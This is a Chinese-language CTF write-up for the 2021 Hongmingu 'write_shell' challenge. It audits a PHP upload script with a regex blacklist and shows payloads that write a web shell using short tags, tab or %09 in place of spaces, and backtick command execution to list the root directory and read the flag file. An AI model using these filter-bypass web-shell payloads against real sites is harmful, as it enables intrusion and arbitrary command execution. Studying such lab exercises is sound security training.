---
title: 红明谷CTF2021-write_shell
date: 2025-04-01 15:39:04
tags:
- shell写入
- 空格过滤绕过
- 短标签绕过
- 反引号执行命令
category:
- 刷题笔记
---

# 红明谷CTF2021-write_shell

代码审计

```
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

传入两个参数

action=pwd时，显示路径

action=upload时，写入内容

---

**check()函数**

通过正则过滤

```
preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)
```

对php的过滤可以使用短标签：`<?=代码?>`

对空格的过滤可使用 “/t” 或 "%09"代替

没有过滤反引号，可以在反引号中执行shell命令

---

首先查看我们文件生成的路径

```
?action=pwd

#sandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/
```

查看目录

```
?action=upload&data=<?=`ls\t/`?>
或
?action=upload&data=<?=`ls%09/`?>
```

访问得到目录信息

```
url/sandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/index.php

#bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
```

---

读取文件

```
?action=upload&data=<?=`cat\t/flllllll1112222222lag`?>
或
?action=upload&data=<?=`cat%09/flllllll1112222222lag`?>
```

访问得到flag

```
sandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/index.php
```

